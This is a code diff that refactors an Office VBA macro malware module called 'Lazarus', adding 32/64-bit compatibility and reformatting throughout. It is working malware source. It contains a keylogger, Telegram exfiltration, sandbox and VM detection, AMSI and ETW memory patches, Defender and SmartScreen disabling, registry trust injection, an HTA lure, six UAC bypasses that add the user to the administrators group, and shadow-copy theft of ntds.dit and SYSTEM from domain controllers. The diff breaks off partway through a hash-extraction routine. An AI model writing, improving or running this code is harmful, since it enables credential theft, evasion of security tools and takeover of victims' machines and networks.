@@ -12,9 +12,13 @@ Option Explicit
     Private Declare PtrSafe Function DeleteTimerQueueTimer Lib "kernel32" (ByVal TimerQueue As LongPtr, ByVal Timer As LongPtr, ByVal CompletionEvent As LongPtr) As Long
     Private Declare PtrSafe Function GlobalAlloc Lib "kernel32" (ByVal uFlags As Long, ByVal dwBytes As LongPtr) As LongPtr
     Private Declare PtrSafe Function GlobalFree Lib "kernel32" (ByVal hMem As LongPtr) As LongPtr
+    Private Declare PtrSafe Function GlobalLock Lib "kernel32" (ByVal hMem As LongPtr) As LongPtr
+    Private Declare PtrSafe Function GlobalUnlock Lib "kernel32" (ByVal hMem As LongPtr) As Long
     Private Declare PtrSafe Function GetCurrentThreadId Lib "kernel32" () As Long
     Private Declare PtrSafe Function IsDebuggerPresent Lib "kernel32" () As Long
+#If Win64 Then
     Private Declare PtrSafe Function GetTickCount64 Lib "kernel32" () As LongLong
+#End If
     Private Declare PtrSafe Function FindFirstFileW Lib "kernel32" (ByVal lpFileName As LongPtr, ByVal lpFindFileData As LongPtr) As LongPtr
     Private Declare PtrSafe Function FindNextFileW Lib "kernel32" (ByVal hFindFile As LongPtr, ByVal lpFindFileData As LongPtr) As Long
     Private Declare PtrSafe Function FindClose Lib "kernel32" (ByVal hFindFile As LongPtr) As Long
@@ -72,6 +76,8 @@ Option Explicit
     Private Declare PtrSafe Function RegSetValueExA Lib "advapi32.dll" (ByVal hKey As LongPtr, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpData As LongPtr, ByVal cbData As Long) As Long
     Private Declare PtrSafe Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As LongPtr) As Long
 
+    Private Const INVALID_HANDLE_VALUE As LongPtr = -1
+
     Private hKeyloggerTimer As LongPtr
     Private pKeylogHeap As LongPtr
     Private pKeylogLock As LongPtr
@@ -80,7 +86,7 @@ Option Explicit
     Private pGlobalLock As LongPtr
     Private hWatchdogTimer As LongPtr
 #Else
-    ' 32‑bit declarations - Office 2010/2013 etc.
+    ' 32‑bit declarations - Office 2010 and older (non-PtrSafe)
     Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
     Private Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (Destination As Any, Source As Any, ByVal Length As Long)
     Private Declare Sub ZeroMemory Lib "ntdll.dll" Alias "RtlZeroMemory" (ByVal Destination As Long, ByVal Length As Long)
@@ -88,6 +94,8 @@ Option Explicit
     Private Declare Function DeleteTimerQueueTimer Lib "kernel32" (ByVal TimerQueue As Long, ByVal Timer As Long, ByVal CompletionEvent As Long) As Long
     Private Declare Function GlobalAlloc Lib "kernel32" (ByVal uFlags As Long, ByVal dwBytes As Long) As Long
     Private Declare Function GlobalFree Lib "kernel32" (ByVal hMem As Long) As Long
+    Private Declare Function GlobalLock Lib "kernel32" (ByVal hMem As Long) As Long
+    Private Declare Function GlobalUnlock Lib "kernel32" (ByVal hMem As Long) As Long
     Private Declare Function GetCurrentThreadId Lib "kernel32" () As Long
     Private Declare Function IsDebuggerPresent Lib "kernel32" () As Long
     Private Declare Function GetTickCount Lib "kernel32" () As Long
@@ -147,6 +155,8 @@ Option Explicit
     Private Declare Function RegSetValueExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpData As Long, ByVal cbData As Long) As Long
     Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
 
+    Private Const INVALID_HANDLE_VALUE As Long = -1
+
     Private hKeyloggerTimer As Long
     Private pKeylogHeap As Long
     Private pKeylogLock As Long
@@ -172,7 +182,6 @@ Private Const PROCESS_ALL_ACCESS As Long = &H1F0FFF
 Private Const MEM_COMMIT As Long = &H1000
 Private Const MEM_RESERVE As Long = &H2000
 Private Const PAGE_EXECUTE_READWRITE As Long = &H40
-Private Const INVALID_HANDLE_VALUE As LongPtr = -1
 Private Const HEAP_MAGIC As Long = &H58424E   ' NBX
 Private Const HEAP_SIZE As Long = 4096
 Private Const REG_HEAP_PTR As String = "HKEY_CURRENT_USER\Software\Microsoft\Office\LazarusHeapPtr"
@@ -195,7 +204,11 @@ Private Type PROCESSENTRY32
     dwSize As Long
     cntUsage As Long
     th32ProcessID As Long
+#If VBA7 Then
     th32DefaultHeapID As LongPtr
+#Else
+    th32DefaultHeapID As Long
+#End If
     th32ModuleID As Long
     cntThreads As Long
     th32ParentProcessID As Long
@@ -204,17 +217,28 @@ Private Type PROCESSENTRY32
     szExeFile As String * 260
 End Type
 
-Private Type POINTAPI: x As Long: y As Long: End Type
+Private Type POINTAPI
+    x As Long
+    y As Long
+End Type
+
 Private Type BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO
     cbSize As Long
     dwInfoVersion As Long
+#If VBA7 Then
     pbNonce As LongPtr
-    cbNonce As Long
     pbAuthData As LongPtr
-    cbAuthData As Long
     pbTag As LongPtr
-    cbTag As Long
     pbMacContext As LongPtr
+#Else
+    pbNonce As Long
+    pbAuthData As Long
+    pbTag As Long
+    pbMacContext As Long
+#End If
+    cbNonce As Long
+    cbAuthData As Long
+    cbTag As Long
     cbMacContext As Long
     cbAAD As Long
     cbData As Long
@@ -249,10 +273,18 @@ End Type
 
 Private Type DATA_BLOB
     cbData As Long
+#If VBA7 Then
     pbData As LongPtr
+#Else
+    pbData As Long
+#End If
 End Type
 
-Private Type FILETIME: dwLowDateTime As Long: dwHighDateTime As Long: End Type
+Private Type FILETIME
+    dwLowDateTime As Long
+    dwHighDateTime As Long
+End Type
+
 Private Type WIN32_FIND_DATAW
     dwFileAttributes As Long
     ftCreationTime As FILETIME
@@ -274,20 +306,17 @@ Private gRunFlag As String
 Private gMachineID As String
 Private gFirstRun As Boolean
 Private gSelfPath As String
-Private gWatchdogActive As Boolean
 Private g_stolenCredentials As Collection
 Private g_emailTargets As Collection
 Private g_usbPropagated As Boolean
 Private g_smbPropagated As Boolean
 Private g_mbrBackup(511) As Byte
+Private g_needRestart As Boolean
+Private g_needRePersist As Boolean
 
 Private m_EngineActive As Boolean
 Private m_PulseCounter As Long
 Private m_OriginalPerformance(3) As Variant
-
-' Safe watchdog flags (set by kernel timer, read by main thread)
-Private g_needRestart As Boolean
-Private g_needRePersist As Boolean
 
 ' ============================================================
 ' 3. UTILITIES WITH RETRY & ERROR LOGGING
@@ -312,7 +341,11 @@ End Function
 
 Sub StealthSleep(ms As Long)
     If ms <= 0 Then Exit Sub
-    If ms >= 1000 Then Application.Wait Now + ms / 86400000# Else Sleep ms
+    If ms >= 1000 Then
+        Application.Wait Now + ms / 86400000#
+    Else
+        Sleep ms
+    End If
 End Sub
 
 Function FileExists(path As String) As Boolean
@@ -352,6 +385,7 @@ Function RobustDownloadFile(url As String, destPath As String, maxRetries As Int
     RobustDownloadFile = False
 End Function
 
+#If Win64 Then
 Private Function CurToUlongLong(cur As Currency) As LongLong
     Dim ll As LongLong
     CopyMemory ll, cur, 8
@@ -362,12 +396,9 @@ Private Function GetTotalPhysicalMemory() As LongLong
     Dim memInfo As MEMORYSTATUSEX
     memInfo.dwLength = Len(memInfo)
     GlobalMemoryStatusEx memInfo
-#If Win64 Then
-    GetTotalPhysicalMemory = memInfo.ullTotalPhys
-#Else
     GetTotalPhysicalMemory = CurToUlongLong(memInfo.ullTotalPhys)
-#End If
 End Function
+#End If
 
 Private Function GetStateFilePath() As String
     GetStateFilePath = Environ("PROGRAMDATA") & "\Lazarus\state.dat"
@@ -472,7 +503,6 @@ Sub BypassSplashLock()
     Application.ScreenUpdating = True
 End Sub
 
-' Add current folder as trusted location and enable VBA object model access
 Private Sub InjectSystemTrust()
     On Error Resume Next
     Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
@@ -480,11 +510,8 @@ Private Sub InjectSystemTrust()
     Dim securityPath As String
     securityPath = "HKCU\Software\Microsoft\Office\" & ver & "\Excel\Security\"
     
-    ' Trusted Locations – current folder
     wsh.RegWrite securityPath & "Trusted Locations\SentinelHost\Path", ThisWorkbook.Path, "REG_SZ"
     wsh.RegWrite securityPath & "Trusted Locations\SentinelHost\AllowSubfolders", 1, "REG_DWORD"
-    
-    ' Trust VBA object model
     wsh.RegWrite securityPath & "AccessVBOM", 1, "REG_DWORD"
     SendToTelegram "SYSTEM_TRUST|Injected trusted location and AccessVBOM"
 End Sub
@@ -570,7 +597,8 @@ Sub DeploySocialEngineeringUI()
     Dim uiPath As String: uiPath = GetTempDir() & "salary_notice_" & Timer & ".hta"
     Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
     Dim f As Object: Set f = fso.CreateTextFile(uiPath, True)
-    f.Write html: f.Close
+    f.Write html
+    f.Close
     CreateObject("WScript.Shell").Run "mshta.exe """ & uiPath & """", 0, False
 End Sub
 
@@ -614,9 +642,13 @@ Sub SendToTelegramChunked(msg As String)
 End Sub
 
 ' ============================================================
-' 7. HIGH-SPEED ASYNC KEYLOGGER (Thread‑safe)
+' 7. HIGH-SPEED ASYNC KEYLOGGER (Thread-safe)
 ' ============================================================
-Private Sub EnterLock(ByVal pLock As LongPtr)
+#If VBA7 Then
+    Private Sub EnterLock(ByVal pLock As LongPtr)
+#Else
+    Private Sub EnterLock(ByVal pLock As Long)
+#End If
     Dim lockVal As Long
     Do
         CopyMemory lockVal, ByVal pLock, 4
@@ -629,12 +661,20 @@ Private Sub EnterLock(ByVal pLock As LongPtr)
     Loop
 End Sub
 
-Private Sub LeaveLock(ByVal pLock As LongPtr)
+#If VBA7 Then
+    Private Sub LeaveLock(ByVal pLock As LongPtr)
+#Else
+    Private Sub LeaveLock(ByVal pLock As Long)
+#End If
     Dim lockVal As Long: lockVal = 0
     CopyMemory ByVal pLock, lockVal, 4
 End Sub
 
-Private Sub Keylogger_Callback(ByVal lpParam As LongPtr, ByVal TimerOrWaitFired As Byte)
+#If VBA7 Then
+    Private Sub Keylogger_Callback(ByVal lpParam As LongPtr, ByVal TimerOrWaitFired As Byte)
+#Else
+    Private Sub Keylogger_Callback(ByVal lpParam As Long, ByVal TimerOrWaitFired As Byte)
+#End If
     On Error Resume Next
     Static lastKeys(255) As Integer
     Dim i As Integer, state As Integer
@@ -679,14 +719,43 @@ Private Sub StopAsyncKeylogger()
 End Sub
 
 Function GetKeyName(vKey As Integer) As String
-    On Error Resume Next
     Select Case vKey
-        Case 8: "[BACKSPACE]": Case 9: "[TAB]": Case 13: "[ENTER]": Case 16: "[SHIFT]": Case 17: "[CTRL]": Case 18: "[ALT]"
-        Case 20: "[CAPS]": Case 32: " ": Case 46: "[DEL]": Case 37 To 40: "[ARROW]": Case 48 To 57: Chr(vKey)
-        Case 65 To 90: If GetAsyncKeyState(16) And &H8000 Then Chr(vKey) Else LCase(Chr(vKey))
-        Case 96 To 105: "[NUMPAD" & (vKey - 96) & "]": Case 106: "[NUMPAD*]": Case 107: "[NUMPAD+]": Case 109: "[NUMPAD-]": Case 110: "[NUMPAD.]": Case 111: "[NUMPAD/]"
-        Case 112 To 123: "[F" & (vKey - 111) & "]": Case 186: ";": Case 187: "=": Case 188: ",": Case 189: "-": Case 190: ".": Case 191: "/"
-        Case 192: "`": Case 219: "[": Case 220: "\": Case 221: "]": Case 222: "'": Case Else: ""
+        Case 8: GetKeyName = "[BACKSPACE]"
+        Case 9: GetKeyName = "[TAB]"
+        Case 13: GetKeyName = "[ENTER]"
+        Case 16: GetKeyName = "[SHIFT]"
+        Case 17: GetKeyName = "[CTRL]"
+        Case 18: GetKeyName = "[ALT]"
+        Case 20: GetKeyName = "[CAPS]"
+        Case 32: GetKeyName = " "
+        Case 46: GetKeyName = "[DEL]"
+        Case 37 To 40: GetKeyName = "[ARROW]"
+        Case 48 To 57: GetKeyName = Chr(vKey)
+        Case 65 To 90
+            If (GetAsyncKeyState(16) And &H8000) Then
+                GetKeyName = Chr(vKey)
+            Else
+                GetKeyName = LCase(Chr(vKey))
+            End If
+        Case 96 To 105: GetKeyName = "[NUMPAD" & (vKey - 96) & "]"
+        Case 106: GetKeyName = "[NUMPAD*]"
+        Case 107: GetKeyName = "[NUMPAD+]"
+        Case 109: GetKeyName = "[NUMPAD-]"
+        Case 110: GetKeyName = "[NUMPAD.]"
+        Case 111: GetKeyName = "[NUMPAD/]"
+        Case 112 To 123: GetKeyName = "[F" & (vKey - 111) & "]"
+        Case 186: GetKeyName = ";"
+        Case 187: GetKeyName = "="
+        Case 188: GetKeyName = ","
+        Case 189: GetKeyName = "-"
+        Case 190: GetKeyName = "."
+        Case 191: GetKeyName = "/"
+        Case 192: GetKeyName = "`"
+        Case 219: GetKeyName = "["
+        Case 220: GetKeyName = "\"
+        Case 221: GetKeyName = "]"
+        Case 222: GetKeyName = "'"
+        Case Else: GetKeyName = ""
     End Select
 End Function
 
@@ -695,6 +764,8 @@ End Function
 ' ============================================================
 Function IsSandbox() As Boolean
     On Error Resume Next
+    Dim f As Variant
+    Dim vp As Variant
 #If Win64 Then
     If GetTotalPhysicalMemory() < 2 * 1024 * 1024 * 1024 Then IsSandbox = True: Exit Function
 #End If
@@ -707,36 +778,66 @@ Function IsSandbox() As Boolean
     totalBytesLL = 128 * 1024 * 1024 * 1024
 #End If
     If totalBytesLL < 64 * 1024 * 1024 * 1024 Then IsSandbox = True: Exit Function
+#If Win64 Then
     If GetTickCount64() < 5 * 60 * 1000 Then IsSandbox = True: Exit Function
-    Dim snap As LongPtr: snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
+#Else
+    If GetTickCount() < 5 * 60 * 1000 Then IsSandbox = True: Exit Function
+#End If
+#If VBA7 Then
+    Dim snap As LongPtr
+#Else
+    Dim snap As Long
+#End If
+    snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
     If snap <> -1 Then
         Dim pe As PROCESSENTRY32: pe.dwSize = Len(pe)
         Dim count As Long: count = 0
-        If Process32First(snap, pe) Then Do: count = count + 1: Loop While Process32Next(snap, pe)
-        CloseHandle snap: If count < 20 Then IsSandbox = True: Exit Function
+        If Process32First(snap, pe) Then
+            Do
+                count = count + 1
+            Loop While Process32Next(snap, pe)
+        End If
+        CloseHandle snap
+        If count < 20 Then IsSandbox = True: Exit Function
     End If
     If GetSystemMetrics(SM_MOUSEPRESENT) <> 0 Then
-        Dim p1 As POINTAPI, p2 As POINTAPI: GetCursorPos p1: StealthSleep 100: GetCursorPos p2
+        Dim p1 As POINTAPI, p2 As POINTAPI
+        GetCursorPos p1
+        StealthSleep 100
+        GetCursorPos p2
         If p1.x = p2.x And p1.y = p2.y Then IsSandbox = True: Exit Function
     End If
     Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
     If fso.FileExists("C:\windows\system32\vmtools.dll") Or fso.FileExists("C:\windows\system32\vboxhook.dll") Then IsSandbox = True: Exit Function
     Dim vmProcs As Variant: vmProcs = Array("vmtoolsd.exe", "vboxservice.exe", "vboxtray.exe", "VGAuthService.exe", "vmwareuser.exe", "qemu-ga.exe", "joeboxcontrol.exe", "cuckoo.exe")
-    Dim snap2 As LongPtr: snap2 = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
+#If VBA7 Then
+    Dim snap2 As LongPtr
+#Else
+    Dim snap2 As Long
+#End If
+    snap2 = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
     If snap2 <> -1 Then
         Dim pe2 As PROCESSENTRY32: pe2.dwSize = Len(pe2)
         If Process32First(snap2, pe2) Then
             Do
                 Dim procName As String: procName = LCase(Trim(pe2.szExeFile))
-                Dim vp As Variant
-                For Each vp In vmProcs: If InStr(procName, vp) > 0 Then CloseHandle snap2: IsSandbox = True: Exit Function: Next
+                For Each vp In vmProcs
+                    If InStr(procName, vp) > 0 Then
+                        CloseHandle snap2
+                        IsSandbox = True
+                        Exit Function
+                    End If
+                Next
             Loop While Process32Next(snap2, pe2)
-        End If: CloseHandle snap2
+        End If
+        CloseHandle snap2
     End If
     Dim user As String: user = LCase(Environ("USERNAME"))
     If InStr(user, "sandbox") > 0 Or InStr(user, "malware") > 0 Or InStr(user, "test") > 0 Or InStr(user, "analyst") > 0 Or InStr(user, "virus") > 0 Then IsSandbox = True: Exit Function
     Dim sandFiles As Variant: sandFiles = Array("C:\sample.exe", "C:\tools\", "C:\analysis\", "C:\malware\")
-    For Each f In sandFiles: If fso.FileExists(f) Or fso.FolderExists(f) Then IsSandbox = True: Exit Function: Next
+    For Each f In sandFiles
+        If fso.FileExists(f) Or fso.FolderExists(f) Then IsSandbox = True: Exit Function
+    Next
 End Function
 
 Sub PatchAMSI()
@@ -744,13 +845,29 @@ Sub PatchAMSI()
     Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
     wsh.RegWrite "HKLM\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}\Enabled", 0, "REG_DWORD"
     wsh.RegWrite "HKCU\Software\Microsoft\Windows Script\Settings\AmsiEnable", 0, "REG_DWORD"
-    Dim hAmsi As LongPtr: hAmsi = LoadLibraryA("amsi.dll")
+#If VBA7 Then
+    Dim hAmsi As LongPtr
+#Else
+    Dim hAmsi As Long
+#End If
+    hAmsi = LoadLibraryA("amsi.dll")
     If hAmsi <> 0 Then
-        Dim pAmsiScanBuffer As LongPtr: pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer")
+#If VBA7 Then
+        Dim pAmsiScanBuffer As LongPtr
+#Else
+        Dim pAmsiScanBuffer As Long
+#End If
+        pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer")
         If pAmsiScanBuffer <> 0 Then
             Dim oldProtect As Long
             If VirtualProtect(pAmsiScanBuffer, 6, &H40, oldProtect) Then
-                Dim patch(5) As Byte: patch(0) = &HB8: patch(1) = &H0: patch(2) = &H0: patch(3) = &H0: patch(4) = &H0: patch(5) = &HC3
+                Dim patch(5) As Byte
+                patch(0) = &HB8
+                patch(1) = &H0
+                patch(2) = &H0
+                patch(3) = &H0
+                patch(4) = &H0
+                patch(5) = &HC3
                 CopyMemory ByVal pAmsiScanBuffer, patch(0), 6
                 VirtualProtect(pAmsiScanBuffer, 6, oldProtect, oldProtect)
             End If
@@ -763,13 +880,27 @@ Sub KillETW()
     On Error Resume Next
     Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
     wsh.RegWrite "HKLM\SYSTEM\CurrentControlSet\Control\WMI\Security\ETWEnabled", 0, "REG_DWORD"
-    Dim hNtdll As LongPtr: hNtdll = GetModuleHandleA("ntdll.dll")
+#If VBA7 Then
+    Dim hNtdll As LongPtr
+#Else
+    Dim hNtdll As Long
+#End If
+    hNtdll = GetModuleHandleA("ntdll.dll")
     If hNtdll <> 0 Then
-        Dim pEtwEventWrite As LongPtr: pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite")
+#If VBA7 Then
+        Dim pEtwEventWrite As LongPtr
+#Else
+        Dim pEtwEventWrite As Long
+#End If
+        pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite")
         If pEtwEventWrite <> 0 Then
             Dim oldProtect As Long
             If VirtualProtect(pEtwEventWrite, 4, &H40, oldProtect) Then
-                Dim patch(3) As Byte: patch(0) = &H33: patch(1) = &HC0: patch(2) = &HC2: patch(3) = &H14
+                Dim patch(3) As Byte
+                patch(0) = &H33
+                patch(1) = &HC0
+                patch(2) = &HC2
+                patch(3) = &H14
                 CopyMemory ByVal pEtwEventWrite, patch(0), 4
                 VirtualProtect(pEtwEventWrite, 4, oldProtect, oldProtect)
             End If
@@ -790,8 +921,8 @@ Sub DisableDefender()
     wsh.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet\SubmitSamplesConsent", 0, "REG_DWORD"
     wsh.Run "MpCmdRun.exe -RemoveDefinitions -All >nul 2>&1", 0, True
     On Error Resume Next
-    wsh.Run "powershell -c ""Add-MpPreference -ExclusionPath '" & gSelfPath & "'"" >nul 2>&1", 0, True
-    wsh.Run "powershell -c ""Add-MpPreference -ExclusionProcess '" & Application.Name & "'"" >nul 2>&1", 0, True
+    wsh.Run "powershell -ExecutionPolicy Bypass -c ""Add-MpPreference -ExclusionPath '" & gSelfPath & "'"" >nul 2>&1", 0, True
+    wsh.Run "powershell -ExecutionPolicy Bypass -c ""Add-MpPreference -ExclusionProcess '" & Application.Name & "'"" >nul 2>&1", 0, True
     wsh.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows\System\EnableSmartScreen", 0, "REG_DWORD"
     wsh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\AppHost\EnableWebContentEvaluation", 0, "REG_DWORD"
 End Sub
@@ -811,46 +942,84 @@ End Sub
 ' ============================================================
 ' 9. UAC BYPASS (6 methods)
 ' ============================================================
-Sub UACBypass_Fodhelper(): On Error Resume Next: Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
+Sub UACBypass_Fodhelper()
+    On Error Resume Next
+    Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
     wsh.RegWrite "HKCU\Software\Classes\ms-settings\shell\open\command\", "cmd.exe /c net localgroup administrators %username% /add", "REG_SZ"
     wsh.RegWrite "HKCU\Software\Classes\ms-settings\shell\open\command\DelegateExecute", "", "REG_SZ"
-    wsh.Run "fodhelper.exe", 0, True: StealthSleep 3000: RegDeleteTreeA &H80000001, "Software\Classes\ms-settings"
+    wsh.Run "fodhelper.exe", 0, True
+    StealthSleep 3000
+    RegDeleteTreeA &H80000001, "Software\Classes\ms-settings"
 End Sub
-Sub UACBypass_ComputerDefaults(): On Error Resume Next: Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
+
+Sub UACBypass_ComputerDefaults()
+    On Error Resume Next
+    Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
     wsh.RegWrite "HKCU\Software\Classes\ms-settings\shell\open\command\", "cmd.exe /c net localgroup administrators %username% /add", "REG_SZ"
     wsh.RegWrite "HKCU\Software\Classes\ms-settings\shell\open\command\DelegateExecute", "", "REG_SZ"
-    wsh.Run "ComputerDefaults.exe", 0, True: StealthSleep 3000: RegDeleteTreeA &H80000001, "Software\Classes\ms-settings"
+    wsh.Run "ComputerDefaults.exe", 0, True
+    StealthSleep 3000
+    RegDeleteTreeA &H80000001, "Software\Classes\ms-settings"
 End Sub
-Sub UACBypass_Sdclt(): On Error Resume Next: Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
+
+Sub UACBypass_Sdclt()
+    On Error Resume Next
+    Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
     wsh.RegWrite "HKCU\Software\Classes\exefile\shell\runas\command\", "cmd.exe /c net localgroup administrators %username% /add", "REG_SZ"
     wsh.RegWrite "HKCU\Software\Classes\exefile\shell\runas\command\DelegateExecute", "", "REG_SZ"
-    wsh.Run "sdclt.exe", 0, True: StealthSleep 3000: RegDeleteTreeA &H80000001, "Software\Classes\exefile"
+    wsh.Run "sdclt.exe", 0, True
+    StealthSleep 3000
+    RegDeleteTreeA &H80000001, "Software\Classes\exefile"
 End Sub
+
 Sub UACBypass_Cmstp()
-    On Error Resume Next: Dim infPath As String: infPath = GetTempDir() & "lz.inf"
-    Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject"): Dim f As Object: Set f = fso.CreateTextFile(infPath, True)
-    f.WriteLine "[Version]": f.WriteLine "Signature=$chicago$": f.WriteLine "[DefaultInstall]"
-    f.WriteLine "CustomDestination=CustomDestinationSection": f.WriteLine "[CustomDestinationSection]": f.WriteLine "DefaultUIFont=MyUIFont"
-    f.Close: CreateObject("WScript.Shell").Run "cmstp.exe /ni /s """ & infPath & """", 0, True: StealthSleep 3000: fso.DeleteFile infPath
+    On Error Resume Next
+    Dim infPath As String: infPath = GetTempDir() & "lz.inf"
+    Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
+    Dim f As Object: Set f = fso.CreateTextFile(infPath, True)
+    f.WriteLine "[Version]"
+    f.WriteLine "Signature=$chicago$"
+    f.WriteLine "[DefaultInstall]"
+    f.WriteLine "CustomDestination=CustomDestinationSection"
+    f.WriteLine "[CustomDestinationSection]"
+    f.WriteLine "DefaultUIFont=MyUIFont"
+    f.Close
+    CreateObject("WScript.Shell").Run "cmstp.exe /ni /s """ & infPath & """", 0, True
+    StealthSleep 3000
+    fso.DeleteFile infPath
 End Sub
+
 Sub UACBypass_SilentCleanup()
-    On Error Resume Next: Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
+    On Error Resume Next
+    Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
     wsh.Run "schtasks /create /tn ""LazarusElevate"" /tr ""cmd.exe /c net localgroup administrators %username% /add"" /sc once /st 00:00 /ru SYSTEM /f", 0, True
-    wsh.Run "schtasks /run /tn ""LazarusElevate""", 0, True: StealthSleep 3000: wsh.Run "schtasks /delete /tn ""LazarusElevate"" /f", 0, True
+    wsh.Run "schtasks /run /tn ""LazarusElevate""", 0, True
+    StealthSleep 3000
+    wsh.Run "schtasks /delete /tn ""LazarusElevate"" /f", 0, True
 End Sub
-Sub UACBypass_DiskCleanup(): On Error Resume Next: Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
+
+Sub UACBypass_DiskCleanup()
+    On Error Resume Next
+    Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
     wsh.RegWrite "HKCU\Software\Classes\ms-settings\shell\open\command\", "cmd.exe /c net localgroup administrators %username% /add", "REG_SZ"
     wsh.RegWrite "HKCU\Software\Classes\ms-settings\shell\open\command\DelegateExecute", "", "REG_SZ"
-    wsh.Run "cleanmgr.exe", 0, True: StealthSleep 3000: RegDeleteTreeA &H80000001, "Software\Classes\ms-settings"
+    wsh.Run "cleanmgr.exe", 0, True
+    StealthSleep 3000
+    RegDeleteTreeA &H80000001, "Software\Classes\ms-settings"
 End Sub
 
 Sub ElevatePrivileges()
     If IsUserAdmin() Then Exit Sub
-    UACBypass_Sdclt: If IsUserAdmin() Then Exit Sub
-    UACBypass_Cmstp: If IsUserAdmin() Then Exit Sub
-    UACBypass_SilentCleanup: If IsUserAdmin() Then Exit Sub
-    UACBypass_DiskCleanup: If IsUserAdmin() Then Exit Sub
-    UACBypass_Fodhelper: If IsUserAdmin() Then Exit Sub
+    UACBypass_Sdclt
+    If IsUserAdmin() Then Exit Sub
+    UACBypass_Cmstp
+    If IsUserAdmin() Then Exit Sub
+    UACBypass_SilentCleanup
+    If IsUserAdmin() Then Exit Sub
+    UACBypass_DiskCleanup
+    If IsUserAdmin() Then Exit Sub
+    UACBypass_Fodhelper
+    If IsUserAdmin() Then Exit Sub
     UACBypass_ComputerDefaults
 End Sub
 
@@ -858,28 +1027,46 @@ End Sub
 ' 10. DOMAIN CONTROLLER ATTACK
 ' ============================================================
 Function IsDomainController() As Boolean
-    On Error Resume Next: If Not IsUserAdmin() Then Exit Function
-    Dim wsh As Object: Set wsh = CreateObject("WScript.Shell"): wsh.RegRead "HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters"
+    On Error Resume Next
+    If Not IsUserAdmin() Then Exit Function
+    Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
+    wsh.RegRead "HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters"
     IsDomainController = (Err.Number = 0)
 End Function
 
 Sub ExtractNTDSAndSYSTEM()
-    On Error Resume Next: If Not IsUserAdmin() Then Exit Sub
-    Dim wsh As Object: Set wsh = CreateObject("WScript.Shell"): Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
-    Dim vssOut As String: vssOut = GetTempDir() & "vss.out": wsh.Run "cmd /c vssadmin create shadow /for=C: > """ & vssOut & """ 2>&1", 0, True
-    StealthSleep 2000: Dim ts As Object: Set ts = fso.OpenTextFile(vssOut, 1): Dim line As String, shadowVolume As String
-    Do While Not ts.AtEndOfStream: line = ts.ReadLine
-        If InStr(line, "Shadow Copy Volume Name:") > 0 Then shadowVolume = Trim(Mid(line, InStr(line, ":") + 2)): Exit Do
-    Loop: ts.Close: fso.DeleteFile vssOut: If shadowVolume = "" Then Exit Sub
-    wsh.Run "cmd /c mklink /d C:\shadowcopy """ & shadowVolume & """", 0, True: StealthSleep 2000
+    On Error Resume Next
+    If Not IsUserAdmin() Then Exit Sub
+    Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
+    Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
+    Dim vssOut As String: vssOut = GetTempDir() & "vss.out"
+    wsh.Run "cmd /c vssadmin create shadow /for=C: > """ & vssOut & """ 2>&1", 0, True
+    StealthSleep 2000
+    Dim ts As Object: Set ts = fso.OpenTextFile(vssOut, 1)
+    Dim line As String, shadowVolume As String
+    Do While Not ts.AtEndOfStream
+        line = ts.ReadLine
+        If InStr(line, "Shadow Copy Volume Name:") > 0 Then
+            shadowVolume = Trim(Mid(line, InStr(line, ":") + 2))
+            Exit Do
+        End If
+    Loop
+    ts.Close
+    fso.DeleteFile vssOut
+    If shadowVolume = "" Then Exit Sub
+    wsh.Run "cmd /c mklink /d C:\shadowcopy """ & shadowVolume & """", 0, True
+    StealthSleep 2000
     wsh.Run "cmd /c copy C:\shadowcopy\Windows\NTDS\ntds.dit " & GetTempDir() & "ntds.dit", 0, True
-    wsh.Run "cmd /c copy C:\shadowcopy\Windows\System32\config\SYSTEM " & GetTempDir() & "SYSTEM", 0, True: StealthSleep 5000
+    wsh.Run "cmd /c copy C:\shadowcopy\Windows\System32\config\SYSTEM " & GetTempDir() & "SYSTEM", 0, True
+    StealthSleep 5000
     wsh.Run "cmd /c rmdir C:\shadowcopy", 0, True
 End Sub
 
 Sub ExtractHashesFromNTDS()
-    On Error Resume Next: If Not IsUserAdmin() Then Exit Sub
